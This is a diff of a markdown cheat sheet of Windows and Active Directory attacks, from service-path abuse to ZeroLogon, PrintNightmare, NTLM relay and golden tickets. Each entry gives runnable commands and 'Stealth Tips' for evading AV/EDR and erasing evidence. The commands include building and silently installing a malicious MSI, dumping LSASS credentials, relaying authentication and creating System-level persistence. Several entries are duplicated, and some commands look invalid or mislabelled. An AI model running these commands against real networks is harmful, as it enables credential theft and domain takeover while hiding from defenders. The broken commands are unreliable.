 - **Tools**: Mimikatz  
-- **Stealth Tips**: Only do on high-integrity sessions  
+- **Stealth Tips**: Target only necessary users; avoid dumping all  
+</details>
 
+<a name="unquoted-service-path"></a>
+<details>
+  <summary><strong>35. Unquoted Service Path</strong></summary>
+
+- **Purpose**: Exploit unquoted service path to execute malicious binary as SYSTEM  
+- **Functionality**: Service with unquoted path and spaces can execute attacker binary  
+- **Why It's Vulnerable**: OS treats path as space-delimited and searches left-to-right  
+- **How to Test**: Place executable in one of the interpreted paths  
+```powershell
+# Identify service
+wmic service get name,pathname,startmode | findstr /i "Auto"
+```
+- **Tools**: PowerUp, sc.exe  
+- **Stealth Tips**: Restart service quietly; clean up dropped binary  
+</details>
+
+<a name="alwaysinstall-elevated-misconfiguration"></a>
+<details>
+  <summary><strong>36. AlwaysInstallElevated Misconfiguration</strong></summary>
+
+- **Purpose**: Gain SYSTEM privileges via MSI installer  
+- **Functionality**: Exploit policy that allows non-admins to run MSIs as SYSTEM  
+- **Why It's Vulnerable**: Admins leave AlwaysInstallElevated registry key set  
+- **How to Test**: Check registry keys and run malicious MSI  
+```powershell
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+msfvenom -p windows/exec CMD=calc.exe -f msi > evil.msi
+msiexec /quiet /qn /i evil.msi
+```
+- **Tools**: msfvenom, msiexec  
+- **Stealth Tips**: Rename MSI, clean up registry traces  
+</details>
+
+<a name="service-permissions-abuse"></a>
+<details>
+  <summary><strong>37. Service Permissions Abuse</strong></summary>
+
+- **Purpose**: Modify service config to execute code as SYSTEM  
+- **Functionality**: Misconfigured permissions allow binary path modification  
+- **Why It's Vulnerable**: Services run as SYSTEM and permissions often too broad  
+- **How to Test**: Use accesschk to find writable services, modify path  
+```bash
+accesschk.exe -uwcqv "Authenticated Users" * /svc
+sc config <service> binpath= "cmd.exe /c calc.exe"
+```
+- **Tools**: sc.exe, accesschk.exe  
+- **Stealth Tips**: Restore original path; clean artifacts  
+</details>
+
+<a name="wmi-event-subscription-persistence"></a>
+<details>
+  <summary><strong>38. WMI Event Subscription Persistence</strong></summary>
+
+- **Purpose**: Maintain persistence through WMI triggers  
+- **Functionality**: Subscribes to system events and executes payload  
+- **Why It's Vulnerable**: WMI is deeply integrated and hard to audit  
+- **How to Test**: Create a permanent event subscription  
+```powershell
+# PowerShell example
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
+```
+- **Tools**: PowerShell, WMI Explorer  
+- **Stealth Tips**: Name events benignly; delete after use  
+</details>
+
+<a name="admin-sdholder-abuse"></a>
+<details>
+  <summary><strong>39. AdminSDHolder Abuse</strong></summary>
+
+- **Purpose**: Persist elevated privileges via protected groups template  
+- **Functionality**: AdminSDHolder replicates ACLs to high-privilege users every 60 min  
+- **Why It's Vulnerable**: Modifying AdminSDHolder can give you rights over domain admins  
+- **How to Test**: Add self as full control in ACLs of AdminSDHolder  
+```powershell
+Set-ADACL -Target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" ...
+```
+- **Tools**: PowerView, ADSIEdit  
+- **Stealth Tips**: Remove ACLs after use; high risk  
+</details>
+
+<a name="domain-controller-sync-via-rbcd"></a>
+<details>
+  <summary><strong>40. Domain Controller Sync via RBCD</strong></summary>
+
+- **Purpose**: Gain full replication rights and extract hashes  
+- **Functionality**: Combines RBCD + DCSync to replicate secrets  
+- **Why It's Vulnerable**: If RBCD set on DC object, DCSync becomes possible  
+- **How to Test**: Create computer, set delegation to DC, and DCSync  
+```powershell
+# Powermad + Rubeus
+New-MachineAccount ...
+Set-RBCD on DC → Use Rubeus DCSync
+```
+- **Tools**: Powermad, Rubeus, mimikatz  
+- **Stealth Tips**: Use temporary objects; clear evidence  
 </details>
 
 
-<a name="wmi-lateral-movement"></a>
+<a name="netlogon-zero-logon-cve-2020-1472"></a>
 <details>
-  <summary><strong>25. WMI Lateral Movement</strong></summary>
+  <summary><strong>41. Netlogon ZeroLogon (CVE-2020-1472)</strong></summary>
 
-- **Purpose**: Execute commands on remote hosts  
-- **Functionality**: WMI allows remote management access  
-- **Why It's Vulnerable**: Invoke-WmiMethod or wmiexec.py for command execution  
-- **How to Test**: Execute payload via WMI  
-- **Tools**: PowerShell, wmiexec.py  
-- **Stealth Tips**: Avoid noisy payloads; use minimal commands  
-
+- **Purpose**: Gain domain admin access by exploiting Netlogon protocol flaw  
+- **Functionality**: Sends crafted Netlogon messages with zeroed fields  
+- **Why It's Vulnerable**: Cryptographic flaw allows spoofing DC credentials  
+- **How to Test**: Run Python PoC to authenticate as DC  
+```bash
+python3 zerologon_tester.py dc-name dc-ip
+```
+- **Tools**: Impacket, ZeroLogon exploit scripts  
+- **Stealth Tips**: Exploit causes logs; use once and reset DC account  
 </details>
 
-<a name="adcs-esc1%3A-misconfigured-certificate-template"></a>
+<a name="ntlm-relay"></a>
 <details>
-  <summary><strong>26. ADCS ESC1: Misconfigured Certificate Template</strong></summary>
+  <summary><strong>42. NTLM Relay</strong></summary>
 
-- **Purpose**: Impersonate users via template that allows user-supplied subjects  
-- **Functionality**: ENROLLEE_SUPPLIES_SUBJECT enabled with low auth  
-- **Why It's Vulnerable**: Request cert with target UPN  
-- **How to Test**: Use cert to authenticate via PKINIT  
-- **Tools**: Certify, ForgeCert, Rubeus  
-- **Stealth Tips**: Target mid-tier accounts; avoid detection  
-
+- **Purpose**: Intercept and relay authentication to another service  
+- **Functionality**: Man-in-the-middle attack using NTLM challenge-response  
+- **Why It's Vulnerable**: Services accepting NTLM without signing  
+- **How to Test**: Use responder + ntlmrelayx  
+```bash
+responder -I eth0
+ntlmrelayx.py -t ldap://target --escalate-user vulnerable
+```
+- **Tools**: Responder, ntlmrelayx  
+- **Stealth Tips**: Relay once; avoid repeated noise  
 </details>
-<a name="adcs-esc8%3A-ntlm-relay-to-web-enrollment"></a>
+
+<a name="printnightmare-cve-2021-34527"></a>
 <details>
-  <summary><strong>27. ADCS ESC8: NTLM Relay to Web Enrollment</strong></summary>
+  <summary><strong>43. PrintNightmare (CVE-2021-34527)</strong></summary>
 
-- **Purpose**: Relay NTLM to issue certificates  
-- **Functionality**: Web Enrollment allows unsigned NTLM negotiation  
-- **Why It's Vulnerable**: Relay auth to ADCS endpoint  
-- **How to Test**: Request cert and impersonate high-priv user  
-- **Tools**: Impacket (ntlmrelayx), Certify  
-- **Stealth Tips**: Clean up certs and log entries  
-
+- **Purpose**: Remote code execution via Print Spooler service  
+- **Functionality**: Uploads DLL to system via printer API  
+- **Why It's Vulnerable**: Print Spooler exposed and unpatched  
+- **How to Test**: Use exploit to write DLL and trigger  
+```bash
+Invoke-Nightmare -NewUser "pwned" -AddToAdministrators
+```
+- **Tools**: PowerShell PoCs, Mimikatz  
+- **Stealth Tips**: Remove DLL, cleanup user afterward  
 </details>
-<a name="petitpotam-%2B-adcs-%28efsrpc-coercion%29"></a>
+
+<a name="samaccountname-spoofing-cve-2021-42278"></a>
 <details>
-  <summary><strong>28. PetitPotam + ADCS (EFSRPC Coercion)</strong></summary>
+  <summary><strong>44. SAMAccountName Spoofing (CVE-2021-42278)</strong></summary>
 
-- **Purpose**: Force machine auth via EFSRPC and relay to ADCS  
-- **Functionality**: EFSRPC coerce NTLM auth to relay point  
-- **Why It's Vulnerable**: Trigger EFSRPC coercion using PetitPotam  
-- **How to Test**: Relay to ADCS and request certificate  
-- **Tools**: PetitPotam, ntlmrelayx, Certify  
-- **Stealth Tips**: Use selectively; avoid excessive noise  
-
+- **Purpose**: Rename machine account to impersonate a domain admin  
+- **Functionality**: Exploits mismatch in machine account naming checks  
+- **Why It's Vulnerable**: No strict validation for account renames  
+- **How to Test**: Rename machine account and request TGT  
+```powershell
+Rename-ADObject -Identity "CN=old" -NewName "DC01"
+Rubeus asktgt /user:DC01 /rc4:<hash>
+```
+- **Tools**: PowerShell, Rubeus  
+- **Stealth Tips**: Rename back quickly; keep account disposable  
 </details>
-<a name="adminsdholder-persistence"></a>
+
+<a name="petitpotam-adcs-relay"></a>
 <details>
-  <summary><strong>29. AdminSDHolder Persistence</strong></summary>
+  <summary><strong>45. PetitPotam + ADCS Relay</strong></summary>
 
-- **Purpose**: Persistent control via ACL on AdminSDHolder  
-- **Functionality**: AdminSDHolder sets ACLs on protected users  
-- **Why It's Vulnerable**: Modify AdminSDHolder ACLs  
-- **How to Test**: Get control over Domain Admins periodically  
-- **Tools**: PowerView, Set-ACL  
-- **Stealth Tips**: Delay changes and remove traces  
-
+- **Purpose**: Coerce machine to authenticate to attacker and relay to ADCS  
+- **Functionality**: EFSRPC coercion to force auth + ADCS relay  
+- **Why It's Vulnerable**: Unauthenticated access to EFSRPC + misconfigured templates  
+- **How to Test**: Use petitpotam + ntlmrelayx  
+```bash
+python3 petitpotam.py attacker-ip target-ip
+ntlmrelayx.py -t http://CA-server/certsrv/ --adcs
+```
+- **Tools**: petitpotam, ntlmrelayx  
+- **Stealth Tips**: Coerce once; use high-integrity cert template  
 </details>
-<a name="sid-filtering-bypass"></a>
-<details>
-  <summary><strong>30. SID Filtering Bypass</strong></summary>
 
-- **Purpose**: Impersonate foreign domain users via SIDHistory  
-- **Functionality**: Poorly filtered trusts allow SID injection  
-- **Why It's Vulnerable**: Create golden ticket with extra SIDs  
-- **How to Test**: Access resources in trusted domain  
+<a name="delegation-abuse-unconstrained"></a>
+<details>
+  <summary><strong>46. Delegation Abuse - Unconstrained</strong></summary>
+
+- **Purpose**: Abuse unconstrained delegation to impersonate users  
+- **Functionality**: Attacker machine gets TGTs when user logs in  
+- **Why It's Vulnerable**: Unconstrained delegation set on computer object  
+- **How to Test**: Trick user into authenticating to attacker-controlled host  
+```powershell
+# After victim auths
+Rubeus tgtdeleg
+```
+- **Tools**: Rubeus, Mimikatz  
+- **Stealth Tips**: Limit use of captured TGTs; cleanup afterwards  
+</details>
+
+<a name="kerberos-rc4-hashing-deprecated-vuln"></a>
+<details>
+  <summary><strong>47. Kerberos RC4 Hashing (Weak Crypto)</strong></summary>
+
+- **Purpose**: Exploit weak encryption for ticket forging  
+- **Functionality**: Use known hash to forge TGT/TGS  
+- **Why It's Vulnerable**: Legacy support of RC4 and weak crypto algorithms  
+- **How to Test**: Force RC4 with Rubeus and inject forged tickets  
+```powershell
+Rubeus asktgt /user:target /rc4:<ntlm> /ptt
+```
+- **Tools**: Rubeus  
+- **Stealth Tips**: Avoid triggering Kerberos events  
+</details>
+
+<a name="kerberos-golden-ticket"></a>
+<details>
+  <summary><strong>48. Golden Ticket</strong></summary>
+
+- **Purpose**: Forge TGTs as any user including domain admins  
+- **Functionality**: Use krbtgt hash to craft TGT  
+- **Why It's Vulnerable**: DC trusts TGTs signed by krbtgt  
+- **How to Test**: Dump krbtgt hash and create TGT  
+```powershell
+mimikatz "kerberos::ptt golden.kirbi"
+```
 - **Tools**: Mimikatz  
-- **Stealth Tips**: Limit SID usage; avoid well-known SIDs  
-
+- **Stealth Tips**: Use short lifetime TGTs; avoid excessive privileges  
 </details>
-<a name="ldap-acl-enumeration-%26-abuse"></a>
+
+<a name="ldap-signing-bypass"></a>
 <details>
-  <summary><strong>31. LDAP ACL Enumeration & Abuse</strong></summary>
+  <summary><strong>49. LDAP Signing Not Enforced</strong></summary>
 
-- **Purpose**: Find and abuse weak ACLs on AD objects  
-- **Functionality**: Misconfigured ACLs allow privilege escalation  
-- **Why It's Vulnerable**: Enumerate using PowerView/BloodHound  
-- **How to Test**: Exploit RBCD, DCSync, or object control  
-- **Tools**: BloodHound, PowerView, SharpHound  
-- **Stealth Tips**: Prefer low-visibility objects; clean up after  
-
+- **Purpose**: Relay NTLM to LDAP without signing  
+- **Functionality**: AD doesn’t require LDAP signing by default  
+- **Why It's Vulnerable**: Enables relaying to domain controller  
+- **How to Test**: Relay NTLM to LDAP using ntlmrelayx  
+```bash
+ntlmrelayx.py -t ldap://dc-ip --escalate-user victim
+```
+- **Tools**: ntlmrelayx, Responder  
+- **Stealth Tips**: Limit relays; delete accounts created  
 </details>
-<a name="printer-bug-%28ms-rprn-coercion%29"></a>
+
+<a name="overpass-the-hash-pass-the-key"></a>
 <details>
-  <summary><strong>32. Printer Bug (MS-RPRN Coercion)</strong></summary>
+  <summary><strong>50. OverPass-the-Hash (Pass-the-Key)</strong></summary>
 
-- **Purpose**: Force system to auth to attacker listener  
-- **Functionality**: Spooler forces auth to remote UNC path  
-- **Why It's Vulnerable**: Trigger print request to attacker's SMB  
-- **How to Test**: Relay or capture machine hash  
-- **Tools**: SpoolSample, Impacket  
-- **Stealth Tips**: Limit usage; avoid DoS on printer services  
-
-</details>
-<a name="unusual-spn-registration-for-lateral-movement"></a>
-<details>
-  <summary><strong>33. Unusual SPN Registration for Lateral Movement</strong></summary>
-
-- **Purpose**: Use fake SPNs to capture TGS or redirect auth  
-- **Functionality**: SPNs can be registered by users with write access  
-- **Why It's Vulnerable**: Register SPN with setspn or script  
-- **How to Test**: Wait for TGS request and roast/capture  
-- **Tools**: setspn, PowerView  
-- **Stealth Tips**: Use misleading names; monitor SPN alerts  
-
-</details>
-<a name="esc2%3A-template-with-weak-acl"></a>
-<details>
-  <summary><strong>34. ESC2: Template with Weak ACL</strong></summary>
-
-- **Purpose**: Low-privilege users can modify the certificate template permissions.  
-- **Functionality**: Templates with weak DACLs can be edited to allow elevation.  
-- **Why It's Vulnerable**: Enumerate template permissions with Certify, then modify ACL to allow enrollment.  
-- **How to Test**: Use Certify to identify and exploit weak ACLs.  
-- **Tools**: Certify, PowerView  
-- **Stealth Tips**: Use minimal DACL changes and remove custom ACEs post-exploitation.  
-
-</details>
-<a name="esc3%3A-enrollable-by-low-priv-group"></a>
-<details>
-  <summary><strong>35. ESC3: Enrollable by Low-Priv Group</strong></summary>
-
-- **Purpose**: Template allows members of a low-privileged group to enroll certificates.  
-- **Functionality**: Misconfiguration allows wide group enrollment without tight control.  
-- **Why It's Vulnerable**: Use Certify to identify templates accessible by groups like 'Domain Users'.  
-- **How to Test**: Request certs for target users using ForgeCert or Certify.  
-- **Tools**: Certify, ForgeCert, Rubeus  
-- **Stealth Tips**: Do not request certs for Domain Admins directly.  
-
-</details>
-<a name="esc4%3A-manager-approval-misuse"></a>
-<details>
-  <summary><strong>36. ESC4: Manager Approval Misuse</strong></summary>
-
-- **Purpose**: Templates require manager approval but attacker can set themselves as manager.  
-- **Functionality**: Manager approval is not properly enforced; attackers can self-approve.  
-- **Why It's Vulnerable**: Set attacker account as manager of target object, then enroll.  
-- **How to Test**: Use ADUC or PowerShell to set manager attribute, then Certify.  
-- **Tools**: PowerShell, Certify  
-- **Stealth Tips**: Ensure quick usage before manager attribute is reset by policies.  
-
-</details>
-<a name="esc5%3A-enroll-as-machine-template"></a>
-<details>
-  <summary><strong>37. ESC5: Enroll as Machine Template</strong></summary>
-
-- **Purpose**: User-controlled object can request machine certs and impersonate computers.  
-- **Functionality**: Computer templates allow enrollment by authenticated users.  
-- **Why It's Vulnerable**: Enroll for machine auth certificate using ESC1/3 privilege.  
-- **How to Test**: Authenticate as computer using forged certificate.  
-- **Tools**: ForgeCert, Rubeus  
-- **Stealth Tips**: Use computer accounts not in monitoring scope.  
-
-</details>
-<a name="esc6%3A-authenticated-users-can-enroll"></a>
-<details>
-  <summary><strong>38. ESC6: Authenticated Users Can Enroll</strong></summary>
-
-- **Purpose**: Any authenticated user can enroll on the template and impersonate others.  
-- **Functionality**: Lax permissions on published templates allow wide abuse.  
-- **Why It's Vulnerable**: Enumerate with Certify and enroll using target identity.  
-- **How to Test**: Use Rubeus or ForgeCert to request cert, then Kerberos login.  
-- **Tools**: Certify, Rubeus  
-- **Stealth Tips**: Limit cert usage time and clean certificate store.  
-
-</details>
-<a name="esc7%3A-vulnerable-unused-template"></a>
-<details>
-  <summary><strong>39. ESC7: Vulnerable Unused Template</strong></summary>
-
-- **Purpose**: Templates published but unused can still be abused by attackers.  
-- **Functionality**: Old or legacy templates with insecure settings left exposed.  
-- **Why It's Vulnerable**: Find unused templates with weak settings and enroll.  
-- **How to Test**: Use Certify to list and ForgeCert to request.  
-- **Tools**: Certify, ForgeCert  
-- **Stealth Tips**: Avoid highly visible templates; cleanup metadata if possible.  
-
-</details>
-<a name="dcsync-via-genericall--replication-rights"></a>
-<details>
-  <summary><strong>40. DCSync via GenericAll / Replication Rights</strong></summary>
-
-- **Purpose**: Obtain password hashes by syncing AD like a domain controller.  
-- **Functionality**: Accounts with replication rights can pull sensitive data from NTDS.dit.  
-- **Why It's Vulnerable**: Identify users/groups with 'Replicate Directory Changes' and use DCSync.  
-- **How to Test**: Perform DCSync with Mimikatz or Impacket.  
-- **Tools**: Mimikatz, Impacket, PowerView  
-- **Stealth Tips**: Avoid frequent use; remove permissions post-exploitation.  
-
-</details>
-<a name="abusing-genericwrite-on-user-object"></a>
-<details>
-  <summary><strong>41. Abusing GenericWrite on User Object</strong></summary>
-
-- **Purpose**: Gain access by overwriting sensitive attributes like logonScript or UPN.  
-- **Functionality**: GenericWrite allows modifying user attributes for lateral movement.  
-- **Why It's Vulnerable**: Use PowerView to identify writable user objects.  
-- **How to Test**: Modify logonScript or set new UPN, then trigger login.  
-- **Tools**: PowerView, PowerShell  
-- **Stealth Tips**: Revert changes after gaining access to avoid detection.  
-
-</details>
-<a name="overpass-the-hash-%28pass-the-key%29"></a>
-<details>
-  <summary><strong>42. Overpass-the-Hash (Pass-the-Key)</strong></summary>
-
-- **Purpose**: Authenticate with NTLM hash without cracking it.  
-- **Functionality**: Kerberos TGT can be requested using NTLM hash and RC4-HMAC.  
-- **Why It's Vulnerable**: Obtain NTLM hash using Mimikatz, then request TGT with Rubeus.  
-- **How to Test**: Request TGT and inject with Rubeus.  
+- **Purpose**: Authenticate using NTLM hash by forging TGT  
+- **Functionality**: Use AES/RC4 hash to generate TGT  
+- **Why It's Vulnerable**: Kerberos accepts keys instead of passwords  
+- **How to Test**: Use Mimikatz or Rubeus to craft TGT  
+```powershell
+mimikatz "kerberos::ptt /user:user /domain:lab.local /rc4:<ntlm>"
+```
 - **Tools**: Mimikatz, Rubeus  
-- **Stealth Tips**: Use for short sessions; rotate ticket periodically.  
-
+- **Stealth Tips**: Clean up injected tickets  
 </details>
-<a name="rbcd-via-addallowedtoact-%28acl-abuse%29"></a>
+
+
+<a name="resource-based-constrained-delegation"></a>
 <details>
-  <summary><strong>43. RBCD via AddAllowedToAct (ACL Abuse)</strong></summary>
+  <summary><strong>51. Resource-Based Constrained Delegation (RBCD)</strong></summary>
 
-- **Purpose**: Configure RBCD to allow any system to impersonate another.  
-- **Functionality**: Write access to 'msDS-AllowedToActOnBehalfOfOtherIdentity' enables lateral movement.  
-- **Why It's Vulnerable**: Grant RBCD rights on a privileged system to a controlled computer account.  
-- **How to Test**: Create new computer object and configure RBCD, then authenticate.  
-- **Tools**: PowerView, Rubeus, Powermad  
-- **Stealth Tips**: Clean up computer object and delegation settings.  
-
+- **Purpose**: Allow impersonation on target by modifying msDS-AllowedToActOnBehalfOfOtherIdentity  
+- **Functionality**: Attacker-controlled computer account is delegated on victim  
+- **Why It's Vulnerable**: ACL misconfig or writable attributes allow delegation abuse  
+- **How to Test**:
+```powershell
+Add-DComputer -ComputerName 'pwned' -SAMAccountName 'pwned$'
+Set-ADComputer 'victim$' -PrincipalsAllowedToDelegateToAccount 'pwned$'
+```
+- **Tools**: PowerView, Rubeus, Impacket  
+- **Stealth Tips**: Use stealthy names; revert delegation post-access  
 </details>
-<a name="abusing-resource-based-constrained-delegation-%28no-pre-auth%29"></a>
+
+<a name="unquoted-service-path"></a>
 <details>
-  <summary><strong>44. Abusing Resource-Based Constrained Delegation (No Pre-auth)</strong></summary>
+  <summary><strong>52. Unquoted Service Path</strong></summary>
 
-- **Purpose**: Combine with AS-REP Roasting for delegation abuse.  
-- **Functionality**: RBCD can be abused when pre-auth is disabled on accounts.  
-- **Why It's Vulnerable**: Use AS-REP hash and configure RBCD via AddAllowedToAct.  
-- **How to Test**: Crack hash and use delegation to impersonate user.  
-- **Tools**: Rubeus, Mimikatz, PowerView  
-- **Stealth Tips**: Avoid DA accounts; target non-monitored users.  
-
+- **Purpose**: Exploit path parsing to run malicious binary with service privileges  
+- **Functionality**: Windows may misinterpret unquoted service paths with spaces  
+- **Why It's Vulnerable**: Service binary path is not wrapped in quotes  
+- **How to Test**:
+```powershell
+sc qc vulnservice
+# Place binary at 'C:\Program Files\Some App\evil.exe'
+```
+- **Tools**: PowerUp, accesschk.exe  
+- **Stealth Tips**: Clean up binary; requires service restart  
 </details>
-<a name="dcshadow-attack"></a>
-<details>
-  <summary><strong>45. DCShadow Attack</strong></summary>
 
-- **Purpose**: Injects rogue changes directly into AD by impersonating a domain controller.  
-- **Functionality**: Requires special privileges to register as a DC and push directory changes.  
-- **Why It's Vulnerable**: Register attacker as rogue DC and push malicious attributes (e.g., SIDHistory).  
-- **How to Test**: Use Mimikatz to run `lsadump::dcshadow` after configuring the environment.  
+<a name="weak-service-permissions"></a>
+<details>
+  <summary><strong>53. Weak Service Permissions</strong></summary>
+
+- **Purpose**: Modify service binary to execute attacker code  
+- **Functionality**: Service permissions allow write/replace of executable  
+- **Why It's Vulnerable**: Misconfigured DACLs on service or executable  
+- **How to Test**:
+```powershell
+accesschk.exe -uwcqv "Authenticated Users" * /svc
+sc config vulnservice binpath= "C:\evil.exe"
+```
+- **Tools**: PowerUp, accesschk, sc.exe  
+- **Stealth Tips**: Revert path after execution  
+</details>
+
+<a name="mimikatz-sekurlsa-dump"></a>
+<details>
+  <summary><strong>54. Credential Dumping with Mimikatz</strong></summary>
+
+- **Purpose**: Extract plaintext passwords, hashes, and tickets from LSASS  
+- **Functionality**: LSASS memory stores creds of logged-in users  
+- **Why It's Vulnerable**: LSASS is accessible to admin-level users  
+- **How to Test**:
+```powershell
+mimikatz
+privilege::debug
+sekurlsa::logonpasswords
+```
 - **Tools**: Mimikatz  
-- **Stealth Tips**: Use only with stealthy admin access; unregister DC after use.  
-
+- **Stealth Tips**: Avoid AV/EDR detection; use memory-safe methods  
 </details>
-<a name="golden-ticket-attack"></a>
-<details>
-  <summary><strong>46. Golden Ticket Attack</strong></summary>
 
-- **Purpose**: Create Kerberos TGT offline and impersonate any user, including domain admins.  
-- **Functionality**: Requires KRBTGT NTLM hash, usually obtained via DCSync.  
-- **Why It's Vulnerable**: Extract KRBTGT hash and forge a TGT with arbitrary SID and user.  
-- **How to Test**: Forge TGT with Mimikatz and inject into session.  
+<a name="browser-creds-and-lsass"></a>
+<details>
+  <summary><strong>55. Dumping Browser Creds & LSASS Offline</strong></summary>
+
+- **Purpose**: Steal saved browser passwords or LSASS dump for offline parsing  
+- **Functionality**: Use tools to decrypt browser or parse minidumps  
+- **Why It's Vulnerable**: Browsers and LSASS often store sensitive data  
+- **How to Test**:
+```bash
+procdump64.exe -ma lsass.exe lsass.dmp
+mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
+```
+- **Tools**: Mimikatz, procdump, LaZagne  
+- **Stealth Tips**: Upload & analyze offline; clean up dumps  
+</details>
+
+<a name="wmi-persistence"></a>
+<details>
+  <summary><strong>56. WMI Event Subscription Persistence</strong></summary>
+
+- **Purpose**: Maintain access using permanent WMI events  
+- **Functionality**: Register event filters and consumers to execute payload  
+- **Why It's Vulnerable**: WMI can persist actions without files  
+- **How to Test**:
+```powershell
+Invoke-WmiEvent -Trigger Win32ProcessStartTrace -Command "calc.exe"
+```
+- **Tools**: PowerShell, WMIExplorer  
+- **Stealth Tips**: Hard to detect; clear subscriptions later  
+</details>
+
+<a name="scheduled-task-persistence"></a>
+<details>
+  <summary><strong>57. Scheduled Task Persistence</strong></summary>
+
+- **Purpose**: Run payload at logon or system boot  
+- **Functionality**: Task Scheduler executes attacker-defined task  
+- **Why It's Vulnerable**: Misconfigured permissions or admin access  
+- **How to Test**:
+```powershell
+schtasks /create /tn "Updater" /tr "C:\evil.exe" /sc onlogon /ru System
+```
+- **Tools**: schtasks, PowerSploit  
+- **Stealth Tips**: Use legit-looking names and paths  
+</details>
+
+<a name="user-account-control-bypass"></a>
+<details>
+  <summary><strong>58. UAC Bypass</strong></summary>
+
+- **Purpose**: Elevate from medium integrity to high integrity without prompt  
+- **Functionality**: Abuse auto-elevated binaries  
+- **Why It's Vulnerable**: Auto-elevate rules and DLL hijacking  
+- **How to Test**:
+```powershell
+Invoke-BinaryUACBypass -Method fodhelper -Command "C:\evil.exe"
+```
+- **Tools**: UACME, PowerUp  
+- **Stealth Tips**: Use signed binaries if possible  
+</details>
+
+<a name="shadow-credentials"></a>
+<details>
+  <summary><strong>59. Shadow Credentials</strong></summary>
+
+- **Purpose**: Persist access via alternate credentials (KeyCredential)  
+- **Functionality**: Add attacker public key to victim user object  
+- **Why It's Vulnerable**: Weak ACLs allow key injection  
+- **How to Test**:
+```bash
+certify shadow /user:target /dc:dc-ip /machine:attacker
+```
+- **Tools**: Certify, Whisker, SharpHound  
+- **Stealth Tips**: Silent persistence method  
+</details>
+
+<a name="adcs-template-misconfig"></a>
+<details>
+  <summary><strong>60. ADCS Certificate Template Misconfig</strong></summary>
+
+- **Purpose**: Abuse vulnerable certificate templates to escalate  
+- **Functionality**: Enroll in low-privilege templates with high privilege rights  
+- **Why It's Vulnerable**: Wrong security descriptors on templates  
+- **How to Test**:
+```bash
+certify find /vulnerable
+certify request /template:User /altname:admin
+```
+- **Tools**: Certify, ADCSKit  
+- **Stealth Tips**: Remove certs after use  
+</details>
+
+<a name="printerbug-coercion"></a>
+<details>
+  <summary><strong>61. PrinterBug Coercion</strong></summary>
+
+- **Purpose**: Coerce machine to authenticate to attacker  
+- **Functionality**: Send Print Spooler call that triggers SMB auth  
+- **Why It's Vulnerable**: Printer bug causes machine auth leak  
+- **How to Test**:
+```bash
+rpcdump.py @target -U user
+printerbug.py attacker@domain target
+```
+- **Tools**: printerbug.py, Responder  
+- **Stealth Tips**: Use once per target; rotate SMB listener  
+</details>
+
+<a name="priv-esc-across-trust-key-abuse"></a>
+<details>
+  <summary><strong>62. PrivEsc across External Trust – Trust Key Abuse</strong></summary>
+
+- **Purpose**: Exploit trust misconfig to access another domain  
+- **Functionality**: Abuse shared trust keys to forge cross-domain tickets  
+- **Why It's Vulnerable**: Poor trust config allows forging with known keys  
+- **How to Test**:
+```powershell
+Rubeus tgtdeleg /rc4:<trustkey> /domain:child.domain
+```
+- **Tools**: Rubeus, Mimikatz  
+- **Stealth Tips**: Minimal noise across domains; cleanup tickets  
+</details>
+
+<a name="kerberos-key-listing-dumping"></a>
+<details>
+  <summary><strong>63. Kerberos Key Listing/Dumping</strong></summary>
+
+- **Purpose**: Extract Kerberos keys from memory or dump  
+- **Functionality**: Keys used for ticket encryption are dumped from LSASS  
+- **Why It's Vulnerable**: Keys reside in memory  
+- **How to Test**:
+```powershell
+mimikatz "sekurlsa::ekeys"
+```
 - **Tools**: Mimikatz  
-- **Stealth Tips**: Avoid ticket lifetime >1 hour; clean injected tickets.  
-
+- **Stealth Tips**: Avoid AV detection; use offline analysis  
 </details>
-<a name="skeleton-key-attack"></a>
+
+<a name="kerberos-renewable-ticket-abuse"></a>
 <details>
-  <summary><strong>47. Skeleton Key Attack</strong></summary>
+  <summary><strong>64. Renewable Kerberos Ticket Abuse</strong></summary>
 
-- **Purpose**: Load a master password (skeleton key) into memory to allow access to all accounts.  
-- **Functionality**: Bypass authentication by patching LSASS process in memory.  
-- **Why It's Vulnerable**: Inject skeleton key on DC using Mimikatz and use fixed password to log in.  
-- **How to Test**: Run `mimikatz sekurlsa::patch` on DC and use key to authenticate.  
-- **Tools**: Mimikatz  
-- **Stealth Tips**: Trigger alerts on AV/EDR; limit use to labs or stealth environments.  
-
-</details>
-<a name="sidhistory-injection"></a>
-<details>
-  <summary><strong>48. SIDHistory Injection</strong></summary>
-
-- **Purpose**: Grants elevated access by injecting SIDHistory from privileged accounts.  
-- **Functionality**: Accounts with WriteMember rights can push privileged SIDs to low-priv accounts.  
-- **Why It's Vulnerable**: Inject SIDHistory using Mimikatz or PowerShell on a domain-joined system.  
-- **How to Test**: Modify LDAP attributes or use DCShadow to insert SIDs.  
-- **Tools**: Mimikatz, PowerShell, DCShadow  
-- **Stealth Tips**: Clean up SIDHistory to avoid detection and correlation.  
-
-</details>
-<a name="adminsdholder-abuse"></a>
-<details>
-  <summary><strong>49. AdminSDHolder Abuse</strong></summary>
-
-- **Purpose**: Privilege persistence by modifying ACLs of protected accounts group template.  
-- **Functionality**: Objects under AdminSDHolder inherit permissions every 60 minutes.  
-- **Why It's Vulnerable**: Add backdoor ACEs to AdminSDHolder to persist access to DA accounts.  
-- **How to Test**: Use PowerView to add rights and wait for SDProp job to apply ACLs.  
-- **Tools**: PowerView, ADSI Edit  
-- **Stealth Tips**: Remove ACEs from AdminSDHolder after use.  
-
-</details>
-<a name="unconstrained-delegation-abuse"></a>
-<details>
-  <summary><strong>50. Unconstrained Delegation Abuse</strong></summary>
-
-- **Purpose**: Extract TGTs from memory of machines with unconstrained delegation.  
-- **Functionality**: Any user logging onto these machines exposes their TGT in memory.  
-- **Why It's Vulnerable**: Identify machines with unconstrained delegation using PowerView.  
-- **How to Test**: Force authentication of DA to the host and dump memory.  
-- **Tools**: PowerView, Rubeus, Mimikatz  
-- **Stealth Tips**: Avoid triggering login manually; wait for natural authentication.  
-
-</details>
-<a name="kerberoasting-with-aes-keys"></a>
-<details>
-  <summary><strong>51. Kerberoasting with AES Keys</strong></summary>
-
-- **Purpose**: Obtain TGS encrypted with AES256 for offline cracking.  
-- **Functionality**: Modern environments use AES instead of RC4, requiring different cracking techniques.  
-- **Why It's Vulnerable**: Use Rubeus to request TGS with /aes flag and crack offline.  
